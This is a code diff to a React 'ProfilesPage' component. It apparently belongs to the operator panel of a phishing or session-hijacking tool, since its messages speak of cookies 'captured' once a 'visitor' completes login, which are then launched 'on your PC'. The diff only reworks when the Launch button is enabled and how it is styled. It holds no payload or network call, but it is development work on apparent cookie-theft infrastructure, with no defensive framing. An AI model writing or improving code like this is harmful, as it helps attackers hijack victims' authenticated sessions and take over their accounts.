@@ -105,7 +105,14 @@ export default function ProfilesPage() {
 
   const handleLaunch = async (id: string) => {
     const profile = profiles.find(p => p.id === id);
-    if (profile && profile.authStatus !== 'AUTHENTICATED') {
+    if (!profile) return;
+    
+    if (!profile.cookies || profile.cookies.length === 0) {
+      toast.error('No cookies captured yet — visitor needs to complete authentication first');
+      return;
+    }
+    
+    if (profile.authStatus !== 'AUTHENTICATED') {
       toast.error('Profile not authenticated yet — wait for the visitor to complete login');
       return;
     }
@@ -512,27 +519,39 @@ export default function ProfilesPage() {
                     <X style={{ height: '16px', width: '16px' }} />
                     Close Session
                   </button>
-                ) : (profile.cookies && profile.cookies.length > 0) ? (
+                ) : (
                   <>
                     <button
                       onClick={() => handleLaunch(profile.id)}
-                      disabled={actionLoading === profile.id || launchPending.has(profile.id)}
+                      disabled={
+                        actionLoading === profile.id || 
+                        launchPending.has(profile.id) ||
+                        !profile.cookies ||
+                        profile.cookies.length === 0
+                      }
                       style={{
                         flex: 1,
                         display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
                         padding: '8px 16px',
-                        backgroundColor: profile.authStatus !== 'AUTHENTICATED'
+                        backgroundColor: (!profile.cookies || profile.cookies.length === 0)
+                          ? 'rgba(255,255,255,0.03)'
+                          : profile.authStatus !== 'AUTHENTICATED'
                           ? 'rgba(255,255,255,0.05)'
                           : launchPending.has(profile.id)
                           ? 'rgba(79,127,255,0.3)'
                           : '#4F7FFF',
-                        color: profile.authStatus !== 'AUTHENTICATED' ? 'rgba(226,232,240,0.4)' : '#E2E8F0',
+                        color: (!profile.cookies || profile.cookies.length === 0)
+                          ? 'rgba(226,232,240,0.2)'
+                          : profile.authStatus !== 'AUTHENTICATED' ? 'rgba(226,232,240,0.4)' : '#E2E8F0',
                         borderRadius: '8px', fontSize: '14px', fontWeight: 500,
                         opacity: (actionLoading === profile.id || launchPending.has(profile.id)) ? 0.7 : 1,
-                        cursor: 'pointer', border: 'none',
+                        cursor: (!profile.cookies || profile.cookies.length === 0) ? 'not-allowed' : 'pointer',
+                        border: 'none',
                       }}
                       title={
-                        profile.authStatus !== 'AUTHENTICATED'
+                        (!profile.cookies || profile.cookies.length === 0)
+                          ? 'No cookies captured yet'
+                          : profile.authStatus !== 'AUTHENTICATED'
                           ? 'Not authenticated yet'
                           : launchPending.has(profile.id)
                           ? 'Opening on your PC...'
@@ -549,13 +568,6 @@ export default function ProfilesPage() {
                       Details
                     </button>
                   </>
-                ) : (
-                  <button
-                    onClick={() => setSelectedProfile(profile)}
-                    style={{ flex: 1, padding: '8px 16px', backgroundColor: 'rgba(255,255,255,0.05)', color: 'rgba(226,232,240,0.4)', borderRadius: '8px', fontSize: '14px', fontWeight: 500, border: 'none', cursor: 'pointer' }}
-                  >
-                    Not Authenticated
-                  </button>
                 )}
               </div>
             </div>
